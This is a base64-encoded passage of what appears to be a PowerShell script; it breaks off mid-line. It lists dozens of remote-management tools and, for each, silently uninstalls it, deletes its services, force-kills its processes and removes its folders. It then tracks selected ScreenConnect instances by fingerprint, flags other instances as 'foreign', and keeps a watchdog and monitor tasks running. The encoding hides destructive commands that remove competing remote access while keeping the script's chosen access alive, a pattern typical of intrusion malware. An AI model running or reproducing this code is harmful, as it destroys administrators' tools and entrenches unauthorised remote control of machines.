bGVzXFJlYWxWTkMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmVhbFZOQyIpOyBQcm9kPUAo
J1ZOQyBTZXJ2ZXIqJywnUmVhbFZOQyonKSB9CiAgICAgICAgQHsgVGFnPSdEYW1lV2FyZSc7ICAg
ICBTdmM9QCgnRGFtZVdhcmUqJyk7IFByb2M9QCgnRFdSQ1MqJywnRFdSQ0MqJywnRGFtZVdhcmUq
Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU29sYXJXaW5kcyIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxTb2xhcldpbmRzIiwiJGVudjpQcm9ncmFtRmlsZXNcRGFtZVdhcmUgUmVtb3Rl
IFN1cHBvcnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cRGFtZVdhcmUgUmVtb3RlIFN1cHBv
cnQiKTsgUHJvZD1AKCdEYW1lV2FyZSonKSB9CiAgICAgICAgQHsgVGFnPSdOZXRTdXBwb3J0Jzsg
ICBTdmM9QCgnTmV0U3VwcG9ydConKTsgUHJvYz1AKCdjbGllbnQzMionLCdwY2ljdGwqJyk7IERp
cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmV0U3VwcG9ydCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxOZXRTdXBwb3J0Iik7IFByb2Q9QCgnTmV0U3VwcG9ydConKSB9CiAgICAgICAgQHsgVGFn
PSdTaW1wbGVIZWxwJzsgICBTdmM9QCgnU2ltcGxlSGVscConKTsgUHJvYz1AKCdTaW1wbGVTZXJ2
aWNlKicsJ3NpbXBsZXNlcnZpY2UqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU2ltcGxl
SGVscCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTaW1wbGVIZWxwIik7IFByb2Q9QCgnU2lt
cGxlSGVscConKSB9CiAgICAgICAgQHsgVGFnPSdHZXRTY3JlZW4nOyAgICBTdmM9QCgnR2V0U2Ny
ZWVuKicpOyBQcm9jPUAoJ0dldFNjcmVlbionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xH
ZXRTY3JlZW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR2V0U2NyZWVuIik7IFByb2Q9QCgn
R2V0U2NyZWVuKicpIH0KICAgICAgICBAeyBUYWc9J0lwZXJpdXMnOyAgICAgIFN2Yz1AKCdJcGVy
aXVzKicpOyBQcm9jPUAoJ0lwZXJpdXNSZW1vdGUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
ZXNcSXBlcml1cyBSZW1vdGUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cSXBlcml1cyBSZW1v
dGUiKTsgUHJvZD1AKCdJcGVyaXVzKicpIH0KICAgICAgICBAeyBUYWc9J0lTTE9ubGluZSc7ICAg
U3ZjPUAoJ0lTTGxpZ2h0KicpOyBQcm9jPUAoJ0lTTGxpZ2h0KicsJ0lTTEFsd2F5c09uKicpOyBE
aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXElTTCBPbmxpbmUiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cSVNMIE9ubGluZSIpOyBQcm9kPUAoJ0lTTCBMaWdodConLCdJU0wgQWx3YXlzT24qJykg
fQogICAgICAgIEB7IFRhZz0nQW1teXknOyAgICAgICAgU3ZjPUAoJ0FtbXl5KicpOyBQcm9jPUAo
J0FtbXl5KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFtbXl5IiwiJHtlbnY6UHJvZ3Jh
bUZpbGVzKHg4Nil9XEFtbXl5Iik7IFByb2Q9QCgnQW1teXkqJykgfQogICAgICAgIEB7IFRhZz0n
VWx0cmFWaWV3ZXInOyAgU3ZjPUAoJ1VsdHJhVmlld2VyKicpOyBQcm9jPUAoJ1VsdHJhVmlld2Vy
KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFVsdHJhVmlld2VyIiwiJHtlbnY6UHJvZ3Jh
bUZpbGVzKHg4Nil9XFVsdHJhVmlld2VyIik7IFByb2Q9QCgnVWx0cmFWaWV3ZXIqJykgfQogICAg
ICAgIEB7IFRhZz0nQWVyb0FkbWluJzsgICAgU3ZjPUAoJ0Flcm9BZG1pbionKTsgUHJvYz1AKCdB
ZXJvQWRtaW4qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWVyb0FkbWluIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XEFlcm9BZG1pbiIpOyBQcm9kPUAoJ0Flcm9BZG1pbionKSB9CiAg
ICAgICAgQHsgVGFnPSdMaXRlTWFuYWdlcic7ICBTdmM9QCgnTGl0ZU1hbmFnZXIqJyk7IFByb2M9
QCgnUk9NU2VydmVyKicsJ1JPTVZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xM
aXRlTWFuYWdlciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxMaXRlTWFuYWdlciIpOyBQcm9k
PUAoJ0xpdGVNYW5hZ2VyKicpIH0KICAgICAgICBAeyBUYWc9J1JhZG1pbic7ICAgICAgIFN2Yz1A
KCdSYWRtaW4qJyk7IFByb2M9QCgncnNlcnZlcjMqJywnUmFkbWluKicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXFJhZG1pbiBTZXJ2ZXIgMyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxS
YWRtaW4gU2VydmVyIDMiKTsgUHJvZD1AKCdSYWRtaW4qJykgfQogICAgICAgIEB7IFRhZz0nTm9N
YWNoaW5lJzsgICAgU3ZjPUAoJ254c2VydmVyKicsJ254ZConKTsgUHJvYz1AKCdueGQqJywnbnhz
ZXJ2ZXIqJywnbnhydW5uZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTm9NYWNoaW5l
IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5vTWFjaGluZSIpOyBQcm9kPUAoJ05vTWFjaGlu
ZSonKSB9CiAgICAgICAgQHsgVGFnPSdOaW5qYU9uZSc7ICAgICBTdmM9QCgnTmluamFSTU1BZ2Vu
dCcsJ25pbmphcm1tKicsJ05pbmphUk1NKicpOyBQcm9jPUAoJ05pbmphUk1NQWdlbnQqJywnbmlu
amFybW0qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmluamFSTU1BZ2VudCIsIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxOaW5qYVJNTUFnZW50IiwiJGVudjpQcm9ncmFtRGF0YVxOaW5q
YVJNTUFnZW50IiwiJGVudjpQcm9ncmFtRmlsZXNcTmluamFPbmUiLCIke2VudjpQcm9ncmFtRmls
ZXMoeDg2KX1cTmluamFPbmUiKTsgUHJvZD1AKCdOaW5qYVJNTSonLCdOaW5qYU9uZSonKSB9CiAg
ICAgICAgQHsgVGFnPSdBdGVyYSc7ICAgICAgICBTdmM9QCgnQXRlcmFBZ2VudCcpOyBQcm9jPUAo
J0F0ZXJhQWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQVRFUkEgTmV0d29ya3Mi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQVRFUkEgTmV0d29ya3MiLCIkZW52OlByb2dyYW1E
YXRhXEFURVJBIE5ldHdvcmtzIik7IFByb2Q9QCgnQXRlcmEqJykgfQogICAgICAgIEB7IFRhZz0n
Q29ubmVjdFdpc2UnOyAgU3ZjPUAoJ0xUU2VydmljZScsJ0xUU3ZjTW9uJyk7IFByb2M9QCgnTFRT
dmMqJywnTFRUcmF5KicpOyBEaXJzPUAoIiRlbnY6d2luZGlyXExUU3ZjIiwiJGVudjpQcm9ncmFt
RmlsZXNcTGFiVGVjaCBDbGllbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGFiVGVjaCBD
bGllbnQiKTsgUHJvZD1AKCdDb25uZWN0V2lzZSBBdXRvbWF0ZSonLCdDb25uZWN0V2lzZSBSTU0q
JywnTGFiVGVjaConKSB9CiAgICAgICAgQHsgVGFnPSdLYXNleWEnOyAgICAgICBTdmM9QCgnQWdl
bnRNb24nLCdLYXNleWEqJywnS0FBRFMqJyk7IFByb2M9QCgnQWdlbnRNb24qJywnS2FzZXlhKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEthc2V5YSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxLYXNleWEiKTsgUHJvZD1AKCdLYXNleWEgVlNBKicsJ0thc2V5YSBBZ2VudConKSB9CiAg
ICAgICAgQHsgVGFnPSdOYWJsZSc7ICAgICAgICBTdmM9QCgnQWR2YW5jZWQgTW9uaXRvcmluZyBB
Z2VudConLCdOLWFibGUqJywnTkNlbnRyYWwqJyk7IFByb2M9QCgnRmlsZVN5c3RlbUFnZW50Kics
J05DZW50cmFsKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFkdmFuY2VkIE1vbml0b3Jp
bmcgQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWR2YW5jZWQgTW9uaXRvcmluZyBB
Z2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE4tYWJsZSBUZWNobm9sb2dpZXMiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cTi1hYmxlIFRlY2hub2xvZ2llcyIsIiRlbnY6UHJvZ3JhbUZpbGVzXE1T
UEEgRmlsZXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTVNQQSBGaWxlcyIpOyBQcm9kPUAo
J0FkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQqJywnTi1hYmxlKicsJ04tY2VudHJhbConLCdOLXNp
Z2h0KicsJ1Rha2UgQ29udHJvbConLCdTb2xhcldpbmRzIE1TUConKSB9CiAgICAgICAgQHsgVGFn
PSdTeW5jcm8nOyAgICAgICBTdmM9QCgnU3luY3JvKicsJ0thYnV0byonKTsgUHJvYz1AKCdTeW5j
cm8qJywnS2FidXRvKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJlcGFpclRlY2giLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmVwYWlyVGVjaCIsIiRlbnY6UHJvZ3JhbUZpbGVzXFN5
bmNybyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTeW5jcm8iLCIkZW52OlByb2dyYW1EYXRh
XFN5bmNybyIpOyBQcm9kPUAoJ1N5bmNybyonLCdLYWJ1dG8qJywnUmVwYWlyVGVjaConKSB9CiAg
ICAgICAgQHsgVGFnPSdQdWxzZXdheSc7ICAgICBTdmM9QCgnUHVsc2V3YXkqJywnUEMgTW9uaXRv
cionKTsgUHJvYz1AKCdQQ01vbml0b3JNZ3IqJywnUENNb25pdG9yTWFuYWdlcionLCdQdWxzZXdh
eSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xQdWxzZXdheSIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxQdWxzZXdheSIsIiRlbnY6UHJvZ3JhbUZpbGVzXFBDIE1vbml0b3IiLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cUEMgTW9uaXRvciIpOyBQcm9kPUAoJ1B1bHNld2F5KicsJ1BD
IE1vbml0b3IqJykgfQogICAgICAgIEB7IFRhZz0nU3VwZXJPcHMnOyAgICAgU3ZjPUAoJ1N1cGVy
T3BzKicpOyBQcm9jPUAoJ1N1cGVyT3BzKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFN1
cGVyT3BzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN1cGVyT3BzIiwiJGVudjpQcm9ncmFt
RGF0YVxTdXBlck9wcyIpOyBQcm9kPUAoJ1N1cGVyT3BzKicpIH0KICAgICAgICBAeyBUYWc9J0xl
dmVsJzsgICAgICAgIFN2Yz1AKCdMZXZlbConKTsgUHJvYz1AKCdsZXZlbConKTsgRGlycz1AKCIk
ZW52OlByb2dyYW1GaWxlc1xMZXZlbCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxMZXZlbCIs
IiRlbnY6UHJvZ3JhbURhdGFcTGV2ZWwiKTsgUHJvZD1AKCdMZXZlbConKSB9CiAgICAgICAgQHsg
VGFnPSdBY3Rpb24xJzsgICAgICBTdmM9QCgnQWN0aW9uMSonKTsgUHJvYz1AKCdBY3Rpb24xKics
J2FjdGlvbjFfYWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWN0aW9uMSIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBY3Rpb24xIiwiJGVudjpQcm9ncmFtRGF0YVxBY3Rpb24x
Iik7IFByb2Q9QCgnQWN0aW9uMSonKSB9CiAgICAgICAgQHsgVGFnPSdNYW5hZ2VFbmdpbmUnOyBT
dmM9QCgnTWFuYWdlRW5naW5lKicsJ1VFTVMqJywnRENBZ2VudConKTsgUHJvYz1AKCdNYW5hZ2VF
bmdpbmUqJywnZGNhZ2VudConLCdVRU1TKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE1h
bmFnZUVuZ2luZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNYW5hZ2VFbmdpbmUiKTsgUHJv
ZD1AKCdNYW5hZ2VFbmdpbmUqJywnVUVNUyonLCdEZXNrdG9wIENlbnRyYWwqJywnRW5kcG9pbnQg
Q2VudHJhbConLCdSTU0gQ2VudHJhbConKSB9CiAgICAgICAgQHsgVGFnPSdUYWN0aWNhbFJNTSc7
ICBTdmM9QCgndGFjdGljYWxybW0qJywnTWVzaCBBZ2VudCcsJ01lc2hBZ2VudCcpOyBQcm9jPUAo
J3RhY3RpY2Fscm1tKicsJ21lc2hhZ2VudConLCdNZXNoQWdlbnQqJyk7IERpcnM9QCgiJGVudjpQ
cm9ncmFtRmlsZXNcVGFjdGljYWxBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxUYWN0
aWNhbEFnZW50IiwiJGVudjpQcm9ncmFtRmlsZXNcTWVzaCBBZ2VudCIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxNZXNoIEFnZW50Iik7IFByb2Q9QCgnVGFjdGljYWwqJywnTWVzaCBBZ2VudCon
LCdNZXNoQ2VudHJhbConKSB9CiAgICAgICAgQHsgVGFnPSdNZXNoQ2VudHJhbCc7ICBTdmM9QCgn
TWVzaCBBZ2VudCcsJ01lc2hBZ2VudCcsJ01lc2hDZW50cmFsKicpOyBQcm9jPUAoJ01lc2hBZ2Vu
dConLCdNZXNoQ2VudHJhbConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xNZXNoIEFnZW50
IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1lc2ggQWdlbnQiKTsgUHJvZD1AKCdNZXNoKkFn
ZW50KicsJ01lc2hDZW50cmFsKicpIH0KICAgICAgICBAeyBUYWc9J0NvbnRpbnV1bSc7ICAgIFN2
Yz1AKCdTQUFaKicsJ0NvbnRpbnV1bSonKTsgUHJvYz1AKCdTQUFaKicsJ0NvbnRpbnV1bSonKTsg
RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTQUFaT0QiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
KX1cU0FBWk9EIiwiJGVudjpQcm9ncmFtRmlsZXNcQ29udGludXVtIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XENvbnRpbnV1bSIpOyBQcm9kPUAoJ0NvbnRpbnV1bSonLCdTQUFaKicpIH0KICAg
ICAgICBAeyBUYWc9J05hdmVyaXNrJzsgICAgIFN2Yz1AKCdOYXZlcmlzayonKTsgUHJvYz1AKCdO
YXZlcmlzayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xOYXZlcmlzayIsIiR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfVxOYXZlcmlzayIpOyBQcm9kPUAoJ05hdmVyaXNrKicpIH0KICAgICAg
ICBAeyBUYWc9J0ltbXlCb3QnOyAgICAgIFN2Yz1AKCdJbW15Qm90KicsJ0ltbXkqJyk7IFByb2M9
QCgnSW1teUFnZW50KicsJ0ltbXlCb3QqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcSW1t
eUJvdCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxJbW15Qm90IiwiJGVudjpQcm9ncmFtRGF0
YVxJbW15Qm90Iik7IFByb2Q9QCgnSW1teUJvdConKSB9CiAgICAgICAgQHsgVGFnPSdBdXRvbW94
JzsgICAgICBTdmM9QCgnYW1hZ2VudConLCdBdXRvbW94KicpOyBQcm9jPUAoJ2FtYWdlbnQqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQXV0b21veCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxBdXRvbW94IiwiJGVudjpQcm9ncmFtRGF0YVxhbWFnZW50Iik7IFByb2Q9QCgnQXV0b21v
eConKSB9CiAgICAgICAgQHsgVGFnPSdBY3JvbmlzQ3liZXInOyBTdmM9QCgnQWNyb25pcyonKTsg
UHJvYz1AKCdhY3JvY21kKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFjcm9uaXMiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWNyb25pcyIpOyBQcm9kPUAoJ0Fjcm9uaXMgQ3liZXIq
JywnQWNyb25pcyBBZ2VudConLCdDeWJlciBQcm90ZWN0IEFnZW50KicpIH0KICAgICAgICBAeyBU
YWc9J0RvbW90eic7ICAgICAgIFN2Yz1AKCdEb21vdHoqJyk7IFByb2M9QCgnRG9tb3R6KicpOyBE
aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXERvbW90eiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
fVxEb21vdHoiKTsgUHJvZD1AKCdEb21vdHoqJykgfQogICAgICAgIEB7IFRhZz0nQXV2aWsnOyAg
ICAgICAgU3ZjPUAoJ0F1dmlrKicpOyBQcm9jPUAoJ0F1dmlrKicpOyBEaXJzPUAoIiRlbnY6UHJv
Z3JhbUZpbGVzXEF1dmlrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEF1dmlrIik7IFByb2Q9
QCgnQXV2aWsqJykgfQogICAgICAgIEB7IFRhZz0nQmFycmFjdWRhUk1NJzsgU3ZjPUAoJ0JhcnJh
Y3VkYSonKTsgUHJvYz1AKCdNV1NlcnZpY2UqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
QmFycmFjdWRhIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEJhcnJhY3VkYSIsIiRlbnY6UHJv
Z3JhbUZpbGVzXExldmVsIFBsYXRmb3JtcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxMZXZl
bCBQbGF0Zm9ybXMiKTsgUHJvZD1AKCdCYXJyYWN1ZGEgUk1NKicsJ01hbmFnZWQgV29ya3BsYWNl
KicpIH0KICAgICAgICBAeyBUYWc9J0dvdmVybGFuJzsgICAgIFN2Yz1AKCdHb3ZlcmxhbionKTsg
UHJvYz1AKCdnb3ZlcmxhbionLCdnb3ZhZ2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
c1xHb3ZlcmxhbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxHb3ZlcmxhbiIpOyBQcm9kPUAo
J0dvdmVybGFuKicpIH0KICAgICAgICBAeyBUYWc9J1BEUSc7ICAgICAgICAgIFN2Yz1AKCdQRFEq
Jyk7IFByb2M9QCgnUERRUnVubmVyKicsJ1BEUUludmVudG9yeSonLCdQRFFEZXBsb3kqJyk7IERp
cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWRtaW4gQXJzZW5hbCIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxBZG1pbiBBcnNlbmFsIiwiJGVudjpQcm9ncmFtRmlsZXNcUERRIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFBEUSIpOyBQcm9kPUAoJ1BEUSBEZXBsb3kqJywnUERRIEludmVudG9y
eSonLCdQRFEgQ29ubmVjdConKSB9CiAgICApCgogICAgZm9yZWFjaCAoJHRvb2wgaW4gJHJtbSkg
ewogICAgICAgICRoaXQgPSAkZmFsc2UKICAgICAgICBmb3JlYWNoICgkcGF0IGluICR0b29sLlBy
b2QpIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290
cykgewogICAgICAgICAgICAgICAgR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkZG4g
PSAoR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUpLkRpc3BsYXlOYW1lCiAgICAgICAgICAgICAgICAgICAgaWYgKCRkbiAtYW5kICRkbiAtbGlr
ZSAkcGF0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChJcy1EYXR0b0tlZXBlciAkZG4p
IHsgTG9nICJybW1fc2tpcF9kYXR0b19rZWVwIFskZG5dIjsgcmV0dXJuIH0KICAgICAgICAgICAg
ICAgICAgICAgICAgaWYgKFVuaW5zdGFsbC1Qcm9kdWN0S2V5ICRfKSB7ICRuLnJtbSsrOyAkaGl0
ID0gJHRydWUgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAg
ICAgICAgfQogICAgICAgIH0KICAgICAgICBmb3JlYWNoICgkcGF0IGluICR0b29sLlN2Yykgewog
ICAgICAgICAgICBHZXQtU2VydmljZSAtTmFtZSAkcGF0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgaWYgKElzLURhdHRvS2Vl
cGVyICRfLk5hbWUgLW9yIElzLURhdHRvS2VlcGVyICRfLkRpc3BsYXlOYW1lKSB7IExvZyAicm1t
X3NraXBfZGF0dG9fc3ZjICQoJF8uTmFtZSkiOyByZXR1cm4gfQogICAgICAgICAgICAgICAgJiBz
Yy5leGUgc3RvcCAiJCgkXy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICBT
dGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDUwMAogICAgICAgICAgICAgICAgJiBzYy5leGUgZGVs
ZXRlICIkKCRfLk5hbWUpIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgICRuLnJtbSsr
OyAkaGl0ID0gJHRydWU7IExvZyAicm1tX3N2Y19kZWxldGVkICQoJF8uTmFtZSkgWyQoJHRvb2wu
VGFnKV0iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAk
dG9vbC5Qcm9jKSB7CiAgICAgICAgICAgIEdldC1Qcm9jZXNzIC1OYW1lICRwYXQgLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBT
dG9wLVByb2Nlc3MgLUlkICRfLklkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgICAgICAgICAgICAgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fcHJvY19r
aWxsZWQgJCgkXy5Qcm9jZXNzTmFtZSkgWyQoJHRvb2wuVGFnKV0iCiAgICAgICAgICAgIH0KICAg
ICAgICB9CiAgICAgICAgZm9yZWFjaCAoJGQgaW4gJHRvb2wuRGlycykgewogICAgICAgICAgICBp
ZiAoJGQgLWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkpIHsKICAgICAgICAgICAgICAg
IGlmIChJcy1EYXR0b0tlZXBlciAkZCkgeyBMb2cgInJtbV9za2lwX2RhdHRvX2RpciAkZCI7IGNv
bnRpbnVlIH0KICAgICAgICAgICAgICAgIGlmIChGb3JjZS1SZW1vdmVEaXIgJGQpIHsgJG4ucm1t
Kys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fZGlyX3JlbW92ZWQgJGQiIH0KICAgICAgICAgICAg
ICAgIGVsc2UgeyAkbi5mYWlsKys7IExvZyAicm1tX2Rpcl9SRU1PVkVfRkFJTEVEICRkIiB9CiAg
ICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKCRoaXQpIHsgTG9nICJybW1fZXh0ZXJt
aW5hdGVkICQoJHRvb2wuVGFnKSIgfQogICAgfQoKICAgICRzdW1tYXJ5ID0gImV4dGVybWluYXRl
IHN2Yz0kKCRuLnN2YykgcHJvYz0kKCRuLnByb2MpIGRpcj0kKCRuLmRpcikgcHJvZHVjdD0kKCRu
LnByb2R1Y3QpIHJtbT0kKCRuLnJtbSkgZmFpbD0kKCRuLmZhaWwpIgogICAgTG9nICRzdW1tYXJ5
CiAgICByZXR1cm4gJHN1bW1hcnkKfQoKZnVuY3Rpb24gVXBkYXRlLVN0YXRlIHsKICAgICRrZWVw
ID0gQChHZXQtS2VlcEZpbmdlcnByaW50cykKICAgICRncnl4YUZwID0gR2V0LUdyeXhhRnAKICAg
ICRwcmltID0gJG51bGw7ICRhbHQgPSAkbnVsbDsgJHNjcmlwdDpncnl4YSA9ICRudWxsCiAgICBm
b3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQq
JykpIHsKICAgICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJykg
ewogICAgICAgICAgICBpZiAoJG1hdGNoZXNbMV0gLWVxICc1ZjYwMTA1Nzk4NTJlNTA3JykgeyAk
cHJpbSA9ICIkKCRzdmMuU3RhdHVzKSIgfQogICAgICAgICAgICBlbHNlaWYgKCRtYXRjaGVzWzFd
IC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsgJGFsdCA9ICIkKCRzdmMuU3RhdHVzKSIgfQogICAg
ICAgICAgICBlbHNlaWYgKCRtYXRjaGVzWzFdIC1lcSAkZ3J5eGFGcCkgeyAkc2NyaXB0OmdyeXhh
ID0gIiQoJHN2Yy5TdGF0dXMpIiB9CiAgICAgICAgfQogICAgfQogICAgJGZvcmVpZ24gPSBAKCkK
ICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENs
aWVudConKSkgewogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0p
XCknIC1hbmQgJG1hdGNoZXNbMV0gLW5vdGluICRrZWVwKSB7CiAgICAgICAgICAgICRmb3JlaWdu
ICs9ICRtYXRjaGVzWzFdCiAgICAgICAgfQogICAgfQogICAgJGlkID0gUmVhZC1JZGVudGl0eQog
ICAgJHRhc2tzT2sgPSAwOyAkdGFza3NUb3RhbCA9IDAKICAgIGZvcmVhY2ggKCRrIGluICdUQVNL
X0EnLCdUQVNLX0InLCdUQVNLX0MnLCdUQVNLX0QnKSB7CiAgICAgICAgJHRhc2tzVG90YWwrKwog
ICAgICAgICR0biA9IE5vcm1hbGl6ZS1UYXNrTmFtZSAoW3N0cmluZ10kaWRbJGtdKQogICAgICAg
IGlmICgtbm90ICR0bikgeyBjb250aW51ZSB9CiAgICAgICAgJG1hcmtlciA9IGlmICgkayAtZXEg
J1RBU0tfQicpIHsgJ2V0bF9tb24uY21kJyB9IGVsc2UgeyAnb3duX21vbi5jbWQnIH0KICAgICAg
ICBpZiAoKFRlc3QtVGFza093bnNNb24gJHRuICRtYXJrZXIpIC1vciAoVGVzdC1UYXNrT3duc01v
biAoIlwkdG4iKSAkbWFya2VyKSkgeyAkdGFza3NPaysrIH0KICAgIH0KICAgIGlmICgtbm90ICRN
b25QYXRoKSB7ICRNb25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcgfQog
ICAgJHdkID0gRW5zdXJlLVdhdGNoZG9nCiAgICAkcHJldiA9IEB7fQogICAgJHN0YXRlUGF0aCA9
IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNvbicKICAgIGlmIChUZXN0LVBhdGggJHN0YXRl
UGF0aCkgewogICAgICAgIHRyeSB7IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0
aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbikuUFNPYmplY3QuUHJvcGVydGllcyB8IEZvckVhY2gt
T2JqZWN0IHsgJHByZXZbJF8uTmFtZV0gPSAkXy5WYWx1ZSB9IH0gY2F0Y2gge30KICAgIH0KICAg
ICRpbnN0YWxsQ291bnQgPSAxCiAgICBpZiAoJHByZXYuaW5zdGFsbENvdW50KSB7ICRpbnN0YWxs
Q291bnQgPSBbaW50XSRwcmV2Lmluc3RhbGxDb3VudCB9CiAgICBpZiAoJHByZXYucHJpbSAtYW5k
